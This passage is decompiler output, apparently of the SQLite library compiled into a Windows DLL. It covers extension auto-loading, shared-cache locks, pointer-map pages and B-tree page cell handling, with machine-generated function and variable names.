  int v2; // ebx
  int (__cdecl *v3)(_DWORD *, const char **, void *); // esi
  int v4; // [esp+Ch] [ebp-8h]
  const char *v5; // [esp+10h] [ebp-4h] BYREF

  v1 = 0;
  v2 = 1;
  if ( dword_10186420 )
  {
    do
    {
      v4 = sub_100612DC();
      sub_10061305(v4);
      if ( v1 < dword_10186420 )
      {
        v3 = *(int (__cdecl **)(_DWORD *, const char **, void *))(dword_10186424 + 4 * v1);
      }
      else
      {
        v3 = 0;
        v2 = 0;
      }
      sub_10061317(v4);
      v5 = 0;
      if ( v3 )
      {
        if ( v3(a1, &v5, &unk_100FEC48) )
        {
          sub_100592B1(a1, 1, "automatic extension loading failed: %s", v5);
          v2 = 0;
        }
      }
      sub_10058E74((int)v5);
      ++v1;
    }
    while ( v2 );
  }
}
// 10186420: using guessed type int dword_10186420;
// 10186424: using guessed type int dword_10186424;

//----- (100613B6) --------------------------------------------------------
int __usercall sub_100613B6@<eax>(char a1@<dl>, int a2@<ecx>, int a3)
{
  int v3; // esi
  int result; // eax

  v3 = *(_DWORD *)(a2 + 4);
  if ( !*(_BYTE *)(a2 + 9) )
    return 0;
  if ( *(_DWORD *)(v3 + 68) != a2 && *(_BYTE *)(v3 + 72) )
    return 262;
  for ( result = *(_DWORD *)(v3 + 64); result; result = *(_DWORD *)(result + 12) )
  {
    if ( *(_DWORD *)result != a2 && *(_DWORD *)(result + 4) == a3 && *(_BYTE *)(result + 8) != a1 )
    {
      if ( a1 == 2 )
        *(_BYTE *)(v3 + 73) = 1;
      return 262;
    }
  }
  return result;
}

//----- (1006140B) --------------------------------------------------------
int __usercall sub_1006140B@<eax>(int a1@<ebx>, int a2@<edi>, unsigned __int8 a3)
{
  int v3; // esi
  _DWORD *i; // eax

  v3 = *(_DWORD *)(a2 + 4);
  for ( i = *(_DWORD **)(v3 + 64); i; i = (_DWORD *)i[3] )
  {
    if ( i[1] == a1 && *i == a2 )
      goto LABEL_9;
  }
  i = sub_10059025(0x10u);
  if ( !i )
    return 7;
  i[1] = a1;
  *i = a2;
  i[3] = *(_DWORD *)(v3 + 64);
  *(_DWORD *)(v3 + 64) = i;
LABEL_9:
  if ( a3 > *((_BYTE *)i + 8) )
    *((_BYTE *)i + 8) = a3;
  return 0;
}

//----- (10061456) --------------------------------------------------------
void __usercall sub_10061456(int a1@<ebx>)
{
  int v1; // edi
  _DWORD **v2; // esi
  _DWORD *v3; // eax

  v1 = *(_DWORD *)(a1 + 4);
  v2 = (_DWORD **)(v1 + 64);
  while ( *v2 )
  {
    v3 = *v2;
    if ( **v2 == a1 )
    {
      *v2 = (_DWORD *)v3[3];
      if ( v3[1] != 1 )
        sub_10058E74((int)v3);
    }
    else
    {
      v2 = (_DWORD **)(v3 + 3);
    }
  }
  if ( *(_DWORD *)(v1 + 68) == a1 )
  {
    *(_DWORD *)(v1 + 68) = 0;
    *(_BYTE *)(v1 + 72) = 0;
  }
  else if ( *(_DWORD *)(v1 + 36) != 2 )
  {
    return;
  }
  *(_BYTE *)(v1 + 73) = 0;
}

//----- (1006149E) --------------------------------------------------------
int __usercall sub_1006149E@<eax>(int *a1@<eax>, unsigned int a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  unsigned int *v5; // ebx
  int v7; // [esp+4h] [ebp-8h] BYREF
  int v8; // [esp+8h] [ebp-4h]

  v8 = 0;
  if ( !a1[13] )
  {
    v3 = *a1;
    v7 = 100;
    sub_1006DFE2(&v7, v3);
    v4 = sub_10070BE1(v7);
    a1[13] = (int)v4;
    if ( !v4 )
      return 7;
  }
  v5 = (unsigned int *)a1[13];
  if ( a2 <= *v5 )
    return sub_10070C77(v5, a2);
  return v8;
}

//----- (100614FA) --------------------------------------------------------
int __usercall sub_100614FA@<eax>(int a1@<esi>)
{
  int *v1; // edi
  char *v2; // eax
  int v3; // ebx
  int v4; // ebx
  int *v5; // edi
  int v7; // [esp+Ch] [ebp-4h]

  v1 = (int *)(a1 + 72);
  v7 = sub_10063501(a1, (_DWORD *)(a1 + 72));
  if ( *(_BYTE *)(*(_DWORD *)(a1 + 88) + 2) )
  {
LABEL_7:
    if ( v7 )
      return v7;
    goto LABEL_8;
  }
  v2 = (char *)sub_10058C4C(*v1);
  v3 = (int)v2;
  if ( !v2 )
  {
    v7 = 7;
    goto LABEL_7;
  }
  v7 = sub_100635F1(0, a1, *v1, v2);
  if ( v7 )
  {
    sub_10058E74(v3);
    goto LABEL_7;
  }
  *(_DWORD *)(a1 + 68) = v3;
LABEL_8:
  v4 = 0;
  if ( *(__int16 *)(a1 + 84) >= 0 )
  {
    v5 = (int *)(a1 + 88);
    do
    {
      sub_100620FB(*v5);
      *v5 = 0;
      ++v4;
      ++v5;
    }
    while ( v4 <= *(__int16 *)(a1 + 84) );
  }
  *(_WORD *)(a1 + 84) = -1;
  *(_BYTE *)(a1 + 67) = 2;
  return v7;
}

//----- (10061587) --------------------------------------------------------
int __usercall sub_10061587@<eax>(int a1@<eax>, int a2@<edi>, int a3)
{
  int i; // esi
  int result; // eax

  for ( i = *(_DWORD *)(a1 + 8); i; i = *(_DWORD *)(i + 8) )
  {
    if ( i != a3 && (!a2 || *(_DWORD *)(i + 20) == a2) && *(_BYTE *)(i + 67) == 1 )
    {
      result = sub_100614FA(i);
      if ( result )
        return result;
    }
  }
  return 0;
}

//----- (100615B9) --------------------------------------------------------
void __usercall sub_100615B9(int a1@<esi>)
{
  sub_10058E74(*(_DWORD *)(a1 + 68));
  *(_DWORD *)(a1 + 68) = 0;
  *(_BYTE *)(a1 + 67) = 0;
}

//----- (100615CB) --------------------------------------------------------
int __usercall sub_100615CB@<eax>(int a1@<eax>, unsigned __int8 *a2, __int64 a3, int a4, int *a5)
{
  _DWORD *v5; // esi
  int v8; // edi
  char v9[152]; // [esp+Ch] [ebp-98h] BYREF

  v5 = 0;
  if ( a2 )
  {
    v5 = sub_1005C1FD((int)v9, 150, *(_DWORD *)(a1 + 16), a3, a2);
    if ( !v5 )
      return 7;
  }
  v8 = sub_10063A72(a1, (int)v5, a3, a4, a5);
  if ( a2 )
    sub_1005C313((unsigned int)v5);
  return v8;
}
// 100615CB: using guessed type char var_98[152];

//----- (10061630) --------------------------------------------------------
int __usercall sub_10061630@<eax>(int a1@<esi>)
{
  int v2; // edi
  __int64 v3; // [esp-10h] [ebp-14h]

  if ( *(_BYTE *)(a1 + 67) == 3 )
    return *(_DWORD *)(a1 + 80);
  v3 = *(_QWORD *)(a1 + 72);
  *(_BYTE *)(a1 + 67) = 0;
  v2 = sub_100615CB(a1, *(unsigned __int8 **)(a1 + 68), v3, 0, (int *)(a1 + 80));
  if ( !v2 )
  {
    sub_10058E74(*(_DWORD *)(a1 + 68));
    *(_DWORD *)(a1 + 68) = 0;
  }
  return v2;
}

//----- (1006166F) --------------------------------------------------------
unsigned int __usercall sub_1006166F@<eax>(int a1@<edi>, int a2)
{
  unsigned int v2; // esi
  unsigned int v3; // ecx

  v2 = *(unsigned __int16 *)(a1 + 22) / 5 + 1;
  v3 = v2 * ((a2 - 2) / v2) + 2;
  if ( v3 == 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1 )
    return v2 * ((a2 - 2) / v2) + 3;
  return v3;
}

//----- (100616A8) --------------------------------------------------------
void __usercall sub_100616A8(int a1@<eax>, int *a2@<ecx>, char a3, int a4, int *a5)
{
  unsigned int v7; // edi
  int v8; // eax
  unsigned int v9; // esi
  int v10; // edi
  int v11; // esi
  _BYTE *v12; // esi
  int v13; // eax
  _DWORD *v14; // [esp+10h] [ebp-4h] BYREF

  if ( !*a5 )
  {
    if ( !a1 )
    {
      *a5 = 11;
      return;
    }
    v7 = sub_1006166F((int)a2, a1);
    if ( !v7 )
    {
      v8 = 11;
LABEL_7:
      *a5 = v8;
      return;
    }
    v8 = sub_1006EB74(*a2, v7, &v14, 0);
    if ( v8 )
      goto LABEL_7;
    v9 = a1 - v7;
    v10 = (int)v14;
    v11 = 5 * (v9 - 1);
    if ( v11 >= 0 )
    {
      v12 = (_BYTE *)(*v14 + v11);
      if ( a3 != *v12 || sub_10059C56(v12 + 1) != a4 )
      {
        v13 = sub_1006EFC8(v10);
        *a5 = v13;
        if ( !v13 )
        {
          *v12 = a3;
          sub_10059C70(v12 + 1, a4);
        }
      }
    }
    else
    {
      *a5 = 11;
    }
    sub_1006EC75(v10);
  }
}

//----- (1006175A) --------------------------------------------------------
int __usercall sub_1006175A@<eax>(int a1@<eax>, int *a2@<ecx>, _BYTE *a3, int *a4)
{
  unsigned int v6; // eax
  int v7; // ebx
  unsigned int v8; // edi
  int result; // eax
  int v10; // ebx
  _BYTE *v11; // eax
  _DWORD *v12; // [esp+Ch] [ebp-4h] BYREF

  v6 = sub_1006166F((int)a2, a1);
  v7 = *a2;
  v8 = v6;
  if ( !v6 )
    return 11;
  result = sub_1006EB74(v7, v6, &v12, 0);
  if ( result )
    return result;
  v10 = (int)v12;
  v11 = (_BYTE *)(5 * (a1 - v8 - 1) + *v12);
  *a3 = *v11;
  if ( a4 )
    *a4 = sub_10059C56(v11 + 1);
  sub_1006EC75(v10);
  if ( *a3 && *a3 <= 5u )
    return 0;
  else
    return 11;
}

//----- (100617C9) --------------------------------------------------------
int __usercall sub_100617C9@<eax>(int a1@<ebx>, _BYTE *a2, int a3)
{
  int v3; // edx
  _BYTE *v4; // esi
  bool v5; // zf
  unsigned __int16 v6; // ax
  unsigned __int8 *v7; // esi
  unsigned int v8; // edi
  unsigned __int8 v9; // al
  unsigned __int8 v10; // al
  int v11; // eax
  unsigned __int8 *v12; // ecx
  unsigned __int8 v13; // al
  unsigned __int8 v14; // al
  unsigned __int16 v15; // cx
  int result; // eax
  int v17; // ecx
  int v18; // edx
  int v19; // eax
  unsigned int v20; // [esp+8h] [ebp-8h] BYREF
  int v21; // [esp+Ch] [ebp-4h]

  v3 = a3;
  v4 = a2;
  *(_DWORD *)a1 = a3;
  v5 = a2[2] == 0;
  v6 = (unsigned __int8)a2[6];
  v21 = (unsigned __int8)a2[6];
  if ( v5 )
  {
    v11 = (unsigned __int16)v21;
    *(_DWORD *)(a1 + 16) = 0;
    v12 = (unsigned __int8 *)(v11 + a3);
    v13 = *(_BYTE *)(v11 + a3);
    if ( v13 >= 0x80u )
    {
      v14 = sub_10059BD0(v12, (int *)&v20);
      v8 = v20;
    }
    else
    {
      v8 = v13;
      v14 = 1;
    }
    LOWORD(v21) = v14 + (_WORD)v21;
    *(_DWORD *)(a1 + 12) = 0;
    *(_DWORD *)(a1 + 8) = v8;
  }
  else
  {
    if ( a2[4] )
    {
      v7 = (unsigned __int8 *)(v6 + a3);
      if ( *v7 >= 0x80u )
      {
        v9 = sub_10059BD0(v7, (int *)&v20);
        v8 = v20;
        v3 = a3;
      }
      else
      {
        v8 = *v7;
        v9 = 1;
      }
      LOWORD(v21) = v9 + (_WORD)v21;
    }
    else
    {
      v8 = 0;
    }
    v10 = sub_10059A38((unsigned __int8 *)(v3 + (unsigned __int16)v21), (_DWORD *)(a1 + 8));
    v4 = a2;
    LOWORD(v21) = v10 + (_WORD)v21;
    *(_DWORD *)(a1 + 16) = v8;
  }
  v15 = v21;
  *(_DWORD *)(a1 + 20) = v8;
  *(_WORD *)(a1 + 24) = v15;
  if ( v8 > *((unsigned __int16 *)v4 + 4) )
  {
    v17 = *((unsigned __int16 *)v4 + 5);
    v18 = v17 + (v8 - v17) % ((unsigned int)*(unsigned __int16 *)(*((_DWORD *)v4 + 15) + 22) - 4);
    if ( v18 > *((unsigned __int16 *)v4 + 4) )
      *(_WORD *)(a1 + 26) = v17;
    else
      *(_WORD *)(a1 + 26) = v18;
    v19 = *(unsigned __int16 *)(a1 + 26);
    LOWORD(v19) = v21 + v19;
    *(_WORD *)(a1 + 28) = v19;
    result = v19 + 4;
  }
  else
  {
    *(_WORD *)(a1 + 28) = 0;
    result = v8 + v15;
    *(_WORD *)(a1 + 26) = v8;
    if ( (result & 0xFFFFFFFC) == 0 )
      result = 4;
  }
  *(_WORD *)(a1 + 30) = result;
  return result;
}

//----- (100618E4) --------------------------------------------------------
int __usercall sub_100618E4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v3; // esi
  _BYTE *v4; // ecx
  __int16 v5; // dx

  v3 = *(_DWORD *)(a1 + 64);
  v4 = (_BYTE *)(v3 + *(unsigned __int16 *)(a1 + 12) + 2 * a2);
  HIBYTE(v5) = *v4;
  LOBYTE(v5) = v4[1];
  return sub_100617C9(a3, (_BYTE *)a1, v3 + (unsigned __int16)(*(_WORD *)(a1 + 18) & v5));
}

//----- (1006190B) --------------------------------------------------------
unsigned int __usercall sub_1006190B@<eax>(int a1@<eax>, int a2)
{
  unsigned __int8 *v3; // esi
  unsigned int v4; // eax
  unsigned __int8 v5; // cl
  unsigned __int8 *v6; // edi
  char v7; // cl
  unsigned __int8 v8; // cl
  unsigned int v9; // edi
  unsigned int v10; // eax
  unsigned int result; // eax
  unsigned int v12; // [esp+Ch] [ebp-4h] BYREF

  v3 = (unsigned __int8 *)(a2 + *(unsigned __int8 *)(a1 + 6));
  v4 = 0;
  if ( *(_BYTE *)(a1 + 2) )
  {
    if ( *(_BYTE *)(a1 + 4) )
    {
      LOBYTE(v4) = *v3;
      if ( *v3 >= 0x80u )
      {
        v5 = sub_10059BD0(v3, (int *)&v12);
        v4 = v12;
      }
      else
      {
        v4 = (unsigned __int8)v4;
        v5 = 1;
      }
      v3 += v5;
    }
    v6 = v3 + 9;
    do
      v7 = *v3++ & 0x80;
    while ( v7 && v3 < v6 );
  }
  else
  {
    LOBYTE(v4) = *v3;
    if ( *v3 >= 0x80u )
    {
      v8 = sub_10059BD0(v3, (int *)&v12);
      v4 = v12;
    }
    else
    {
      v4 = (unsigned __int8)v4;
      v8 = 1;
    }
    v3 += v8;
  }
  v9 = *(unsigned __int16 *)(a1 + 8);
  if ( v4 > v9 )
  {
    v10 = *(unsigned __int16 *)(a1 + 10)
        + (v4 - *(unsigned __int16 *)(a1 + 10)) % ((unsigned int)*(unsigned __int16 *)(*(_DWORD *)(a1 + 60) + 22) - 4);
    if ( v10 > v9 )
      v10 = *(unsigned __int16 *)(a1 + 10);
    v4 = v10 + 4;
  }
  result = (unsigned int)&v3[v4 - a2];
  if ( result < 4 )
    return 4;
  return result;
}

//----- (100619BB) --------------------------------------------------------
void __usercall sub_100619BB(int *a1@<edi>, int a2@<esi>, int a3)
{
  int v3; // eax
  int v4; // [esp-8h] [ebp-34h]
  char v5[28]; // [esp+8h] [ebp-24h] BYREF
  unsigned __int16 v6; // [esp+24h] [ebp-8h]

  if ( !*a1 )
  {
    sub_100617C9((int)v5, (_BYTE *)a2, a3);
    if ( v6 )
    {
      v4 = *(_DWORD *)(a2 + 72);
      v3 = sub_10059C56((_BYTE *)(a3 + v6));
      sub_100616A8(v3, *(int **)(a2 + 60), 3, v4, a1);
    }
  }
}
// 100619BB: using guessed type char var_24[28];

//----- (100619FC) --------------------------------------------------------
int __usercall sub_100619FC@<eax>(int a1@<esi>)
{
  unsigned __int16 *v1; // eax
  int v2; // ecx
  int v3; // ebx
  int v4; // edx
  _BYTE *v5; // edi
  int v6; // ecx
  _BYTE *v7; // eax
  unsigned __int16 v8; // cx
  unsigned __int16 v9; // ax
  void *Src; // [esp+8h] [ebp-24h]
  int v12; // [esp+Ch] [ebp-20h]
  int v13; // [esp+10h] [ebp-1Ch]
  int v14; // [esp+14h] [ebp-18h]
  int v15; // [esp+18h] [ebp-14h]
  int v16; // [esp+18h] [ebp-14h]
  int v17; // [esp+1Ch] [ebp-10h]
  _BYTE *i; // [esp+20h] [ebp-Ch]
  int v19; // [esp+24h] [ebp-8h]
  int v20; // [esp+28h] [ebp-4h]

  v1 = *(unsigned __int16 **)(a1 + 60);
  v2 = *(_DWORD *)(*(_DWORD *)v1 + 152);
  v3 = *(_DWORD *)(a1 + 64);
  v15 = *(unsigned __int16 *)(a1 + 12);
  v14 = *(unsigned __int16 *)(a1 + 16);
  v4 = v1[11];
  v5 = (_BYTE *)(v3 + *(unsigned __int8 *)(a1 + 5));
  BYTE1(v1) = v5[5];
  v19 = v4;
  v13 = v2;
  LOBYTE(v1) = v5[6];
  memcpy((void *)(v2 + (unsigned __int16)v1), (const void *)((unsigned __int16)v1 + v3), v4 - (unsigned __int16)v1);
  v6 = v15;
  v17 = 0;
  v20 = v19;
  v16 = v15 + 2 * v14;
  if ( v14 <= 0 )
  {
LABEL_9:
    v5[6] = v20;
    v5[5] = BYTE1(v20);
    v5[1] = 0;
    v5[2] = 0;
    v5[7] = 0;
    memset((void *)(v3 + v16), 0, v20 - v16);
    return *(unsigned __int16 *)(a1 + 14) != v20 - v16 ? 0xB : 0;
  }
  else
  {
    v7 = (_BYTE *)(v6 + v3);
    for ( i = (_BYTE *)(v6 + v3); ; v7 = i )
    {
      HIBYTE(v8) = *v7;
      LOBYTE(v8) = v7[1];
      v12 = v8;
      if ( v8 < v16 )
        break;
      if ( v8 > v19 - 4 )
        break;
      Src = (void *)(v13 + v8);
      v9 = sub_1006190B(a1, (int)Src);
      v20 -= v9;
      if ( v20 < v16 || v9 + v12 > v19 )
        break;
      memcpy((void *)(v3 + v20), Src, v9);
      ++v17;
      *i = BYTE1(v20);
      i[1] = v20;
      i += 2;
      if ( v17 >= v14 )
        goto LABEL_9;
    }
    return 11;
  }
}

//----- (10061B37) --------------------------------------------------------
int __usercall sub_10061B37@<eax>(int a1@<eax>, int a2, int *a3)
{
  int v4; // edx
  int v5; // ecx
  int v6; // eax
  _BYTE *v7; // edi
  int v8; // ebx
  int v9; // edx
  int result; // eax
  int v11; // ecx
  int v12; // ebx
  unsigned __int16 v13; // dx
  unsigned __int16 v14; // dx
  int v15; // edx
  int v16; // esi
  int v17; // ecx
  int v18; // eax
  int v19; // [esp+Ch] [ebp-14h]
  int v20; // [esp+10h] [ebp-10h]
  char v21; // [esp+14h] [ebp-Ch]
  int v22; // [esp+18h] [ebp-8h]
  __int16 v23; // [esp+18h] [ebp-8h]

  v4 = *(unsigned __int16 *)(*(_DWORD *)(a1 + 60) + 22);
  v5 = *(unsigned __int8 *)(a1 + 5);
  v6 = *(_DWORD *)(a1 + 64);
  v20 = v4;
  v7 = (_BYTE *)(v6 + v5);
  v21 = *(_BYTE *)(v6 + v5 + 7);
  v8 = *(unsigned __int16 *)(a1 + 12) + 2 * *(unsigned __int16 *)(a1 + 16);
  HIWORD(v9) = 0;
  BYTE1(v9) = *(_BYTE *)(v6 + v5 + 5);
  v19 = v8;
  LOBYTE(v9) = *(_BYTE *)(v6 + v5 + 6);
  v22 = (unsigned __int16)v9;
  if ( v8 > (unsigned __int16)v9 )
    return 11;
  if ( *(unsigned __int8 *)(v6 + v5 + 7) < 0x3Cu )
  {
    if ( v8 + 2 <= v9 )
    {
      v12 = *(unsigned __int8 *)(v5 + v6 + 2);
      v11 = v5 + 1;
      BYTE1(v12) = *(_BYTE *)(v11 + v6);
      while ( 1 )
      {
        if ( v12 <= 0 )
        {
          v9 = v22;
          goto LABEL_14;
        }
        if ( v12 > v20 - 4 || v12 < v11 + 4 )
          return 11;
        HIBYTE(v13) = *(_BYTE *)(v12 + v6 + 2);
        LOBYTE(v13) = *(_BYTE *)(v12 + v6 + 3);
        if ( v13 >= a2 )
          break;
        HIBYTE(v14) = *(_BYTE *)(v12 + v6);
        v11 = v12;
        LOBYTE(v14) = *(_BYTE *)(v12 + v6 + 1);
        v12 = v14;
      }
      v16 = v13 - a2;
      v23 = v13 - a2;
      if ( v16 >= 4 )
      {
        if ( v12 + v13 > v20 )
          return 11;
        v17 = v13 - a2;
        v18 = v12 + v6;
        *(_BYTE *)(v18 + 2) = HIBYTE(v23);
        *(_BYTE *)(v18 + 3) = v23;
      }
      else
      {
        memcpy((void *)(v6 + v11), (const void *)(v12 + v6), 2u);
        v17 = v16;
        v7[7] = v23 + v21;
      }
      *a3 = v12 + v17;
      return 0;
    }
  }
  else
  {
    result = sub_100619FC(a1);
    if ( result )
      return result;
    HIWORD(v9) = 0;
    BYTE1(v9) = v7[5];
    LOBYTE(v9) = v7[6];
  }
LABEL_14:
  if ( v19 + a2 + 2 > v9 )
  {
    result = sub_100619FC(a1);
    if ( result )
      return result;
    HIWORD(v9) = 0;
    BYTE1(v9) = v7[5];
    LOBYTE(v9) = v7[6];
  }
  v15 = v9 - a2;
  v7[5] = BYTE1(v15);
  v7[6] = v15;
  *a3 = v15;
  return 0;
}

//----- (10061C73) --------------------------------------------------------
int __usercall sub_10061C73@<eax>(int a1@<eax>, int a2, __int16 a3)
{
  int v4; // ecx
  int v5; // edx
  int v6; // eax
  int v7; // edi
  int v8; // ecx
  int v9; // edx
  int v10; // edi
  unsigned __int16 v11; // bx
  _BYTE *v12; // ecx
  _BYTE *v13; // ecx
  int v14; // edx
  int i; // edi
  _BYTE *v17; // edx
  unsigned __int16 v18; // cx
  int v19; // esi
  unsigned __int16 v20; // bx
  unsigned __int8 v21; // cl
  char v22; // ch
  __int16 v23; // cx
  __int16 v24; // cx
  __int16 v25; // cx
  unsigned __int16 v26; // cx
  _BYTE *v27; // esi
  _BYTE *v28; // ecx
  unsigned __int16 v29; // bx
  _BYTE *v30; // edi
  __int16 v31; // cx
  __int16 v32; // ax
  __int16 v33; // ax
  _BYTE *v34; // [esp+Ch] [ebp-Ch]
  int v35; // [esp+10h] [ebp-8h]
  int v36; // [esp+14h] [ebp-4h]
  int v37; // [esp+20h] [ebp+8h]

  v4 = *(unsigned __int8 *)(a1 + 5);
  v5 = *(_DWORD *)(a1 + 60);
  v6 = *(_DWORD *)(a1 + 64);
  v7 = *(unsigned __int16 *)(v5 + 22);
  v9 = *(unsigned __int8 *)(v4 + v6 + 2);
  v36 = v4;
  v8 = v4 + 1;
  BYTE1(v9) = *(_BYTE *)(v8 + v6);
  v35 = v8;
  v10 = v7 - 4;
  while ( v9 < a2 && v9 > 0 )
  {
    if ( v9 < v8 + 4 )
      return 11;
    HIBYTE(v11) = *(_BYTE *)(v9 + v6);
    v8 = v9;
    LOBYTE(v11) = *(_BYTE *)(v9 + v6 + 1);
    v9 = v11;
  }
  if ( v9 > v10 )
    return 11;
  v12 = (_BYTE *)(v6 + v8);
  *v12 = BYTE1(a2);
  v12[1] = a2;
  v13 = (_BYTE *)(v6 + a2);
  v13[1] = v9;
  *v13 = BYTE1(v9);
  v13[3] = a3;
  v13[2] = HIBYTE(a3);
  *(_WORD *)(a1 + 14) += a3;
  v14 = *(unsigned __int8 *)(v6 + v35 + 1);
  BYTE1(v14) = *(_BYTE *)(v6 + v35);
  for ( i = v14; i > 0; i = v26 )
  {
    HIBYTE(v18) = *(_BYTE *)(i + v6);
    v17 = (_BYTE *)(v6 + i + 2);
    HIBYTE(v20) = *v17;
    LOBYTE(v18) = *(_BYTE *)(v6 + i + 1);
    v19 = v18;
    LOBYTE(v20) = *(_BYTE *)(v6 + i + 3);
    v34 = (_BYTE *)(v6 + i + 3);
    if ( v20 + i + 3 >= v18 && v18 )
    {
      v37 = v18 - v20 - i;
      if ( v37 < 0 )
        return 11;
      v21 = *(_BYTE *)(v36 + v6 + 7);
      if ( v37 > v21 )
        return 11;
      *(_BYTE *)(v36 + v6 + 7) = v21 - v37;
      v22 = *(_BYTE *)(v19 + v6);
      *(_BYTE *)(v6 + i + 1) = *(_BYTE *)(v6 + v19 + 1);
      *(_BYTE *)(i + v6) = v22;
      HIBYTE(v23) = *(_BYTE *)(v6 + v19 + 2);
      LOBYTE(v23) = *(_BYTE *)(v6 + v19 + 3);
      v24 = v23 - i;
      i = v35;
      v25 = v19 + v24;
      *v17 = HIBYTE(v25);
      *v34 = v25;
    }
    else
    {
      v35 = i;
    }
    HIBYTE(v26) = *(_BYTE *)(i + v6);
    LOBYTE(v26) = *(_BYTE *)(v6 + i + 1);
  }
  v27 = (_BYTE *)(v36 + v6);
  v28 = (_BYTE *)(v36 + v6 + 1);
  if ( *v28 == *(_BYTE *)(v36 + v6 + 5) && v27[2] == v27[6] )
  {
    HIBYTE(v29) = *v28;
    LOBYTE(v29) = v27[2];
    v30 = (_BYTE *)(v6 + v29);
    memcpy((void *)(v36 + v6 + 1), v30, 2u);
    HIBYTE(v31) = v27[5];
    HIBYTE(v32) = v30[2];
    LOBYTE(v31) = v27[6];
    LOBYTE(v32) = v30[3];
    v33 = v31 + v32;
    v27[5] = HIBYTE(v33);
    v27[6] = v33;
  }
  return 0;
}

//----- (10061DF8) --------------------------------------------------------
int __usercall sub_10061DF8@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  char v4; // dl
  unsigned int v5; // esi
  _WORD *v6; // ecx
  __int16 v7; // cx

  v3 = a2 >> 3;
  *(_BYTE *)(a1 + 3) = v3;
  v4 = v3;
  v5 = a2 & 0xFFFFFFF7;
  *(_BYTE *)(a1 + 6) = 4 * (1 - v3);
  v6 = *(_WORD **)(a1 + 60);
  if ( v5 == 5 )
  {
    *(_BYTE *)(a1 + 2) = 1;
    *(_BYTE *)(a1 + 4) = v4;
    *(_WORD *)(a1 + 8) = v6[14];
    v7 = v6[15];
LABEL_5:
    *(_WORD *)(a1 + 10) = v7;
    return 0;
  }
  if ( v5 == 2 )
  {
    *(_BYTE *)(a1 + 2) = 0;
    *(_BYTE *)(a1 + 4) = 0;
    *(_WORD *)(a1 + 8) = v6[12];
    v7 = v6[13];
    goto LABEL_5;
  }
  return 11;
}

//----- (10061E53) --------------------------------------------------------
int __usercall sub_10061E53@<eax>(int a1@<edi>)
{
  int v1; // ebx
  unsigned __int8 *v2; // esi
  unsigned __int16 v4; // ax
  unsigned __int16 v5; // ax
  unsigned __int16 v6; // dx
  unsigned __int16 v7; // ax
  unsigned __int16 v8; // cx
  bool v9; // zf
  unsigned __int16 v10; // cx
  int v11; // [esp+8h] [ebp-18h]
  unsigned __int16 v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+Ch] [ebp-14h]
  unsigned __int16 v14; // [esp+10h] [ebp-10h]
  unsigned __int16 v15; // [esp+14h] [ebp-Ch]
  unsigned __int16 v16; // [esp+18h] [ebp-8h]
  unsigned __int8 v17; // [esp+1Fh] [ebp-1h]

  if ( !*(_BYTE *)a1 )
  {
    v1 = *(_DWORD *)(a1 + 60);
    v17 = *(_BYTE *)(a1 + 5);
    v2 = (unsigned __int8 *)(v17 + *(_DWORD *)(a1 + 64));
    v11 = *(_DWORD *)(a1 + 64);
    if ( sub_10061DF8(a1, *v2) )
      return 11;
    *(_WORD *)(a1 + 18) = *(_WORD *)(v1 + 20) - 1;
    *(_BYTE *)(a1 + 1) = 0;
    v14 = *(_WORD *)(v1 + 22);
    v4 = v17 + 4 * (3 - *(unsigned __int8 *)(a1 + 3));
    *(_WORD *)(a1 + 12) = v4;
    v12 = v4;
    HIBYTE(v4) = v2[5];
    LOBYTE(v4) = v2[6];
    v15 = v4;
    LOBYTE(v4) = 0;
    HIBYTE(v4) = v2[3];
    v5 = v2[4] | v4;
    *(_WORD *)(a1 + 16) = v5;
    if ( v5 > (*(unsigned __int16 *)(v1 + 20) - 8) / 6 )
      return 11;
    v13 = v12 + 2 * v5;
    HIBYTE(v7) = v2[1];
    v6 = v15 + v2[7];
    LOBYTE(v7) = v2[2];
    if ( v7 )
    {
      while ( v7 >= v13 )
      {
        if ( v7 > v14 - 4 )
          break;
        HIBYTE(v8) = *(_BYTE *)(v7 + v11);
        LOBYTE(v8) = *(_BYTE *)(v7 + v11 + 1);
        v16 = v8;
        v9 = v8 == 0;
        HIBYTE(v10) = *(_BYTE *)(v7 + v11 + 2);
        LOBYTE(v10) = *(_BYTE *)(v7 + v11 + 3);
        if ( !v9 && v16 <= v10 + v7 + 3 )
          break;
        if ( v7 + v10 > v14 )
          break;
        v6 += v10;
        v7 = v16;
        if ( !v16 )
          goto LABEL_12;
      }
      return 11;
    }
LABEL_12:
    if ( v6 > v14 )
      return 11;
    *(_BYTE *)a1 = 1;
    *(_WORD *)(a1 + 14) = v6 - v13;
  }
  return 0;
}

//----- (10061FAA) --------------------------------------------------------
__int16 __usercall sub_10061FAA@<ax>(int a1@<esi>, int a2)
{
  unsigned __int8 v2; // cl
  int v3; // ebx
  _BYTE *v4; // edi
  __int16 result; // ax
  __int16 v6; // [esp+8h] [ebp-8h]
  unsigned __int8 v7; // [esp+Fh] [ebp-1h]

  v2 = *(_BYTE *)(a1 + 5);
  v3 = *(_DWORD *)(a1 + 60);
  v4 = (_BYTE *)(v2 + *(_DWORD *)(a1 + 64));
  *v4 = a2;
  v7 = v2;
  v6 = v2 + 4 * ((a2 & 8) == 0) + 8;
  memset(v4 + 1, 0, 4u);
  v4[7] = 0;
  v4[5] = *(_BYTE *)(v3 + 23);
  v4[6] = *(_BYTE *)(v3 + 22);
  *(_WORD *)(a1 + 14) = *(_WORD *)(v3 + 22) - v6;
  sub_10061DF8(a1, a2);
  *(_BYTE *)(a1 + 5) = v7;
  *(_WORD *)(a1 + 12) = v6;
  *(_BYTE *)(a1 + 1) = 0;
  result = *(_WORD *)(v3 + 20) - 1;
  *(_WORD *)(a1 + 16) = 0;
  *(_WORD *)(a1 + 18) = result;
  *(_BYTE *)a1 = 1;
  return result;
}

//----- (10062040) --------------------------------------------------------
int __usercall sub_10062040@<eax>(int a1@<edx>, int *a2@<ecx>, int a3)
{
  int result; // eax
  int v4; // esi

  result = a2[1];
  v4 = *a2;
  *(_DWORD *)(result + 68) = a2;
  *(_DWORD *)(result + 60) = a3;
  *(_DWORD *)(result + 64) = v4;
  *(_DWORD *)(result + 72) = a1;
  *(_BYTE *)(result + 5) = a1 != 1 ? 0 : 0x64;
  return result;
}

//----- (10062069) --------------------------------------------------------
int __usercall sub_10062069@<eax>(int *a1@<esi>, unsigned int a2, int *a3, int a4)
{
  int result; // eax
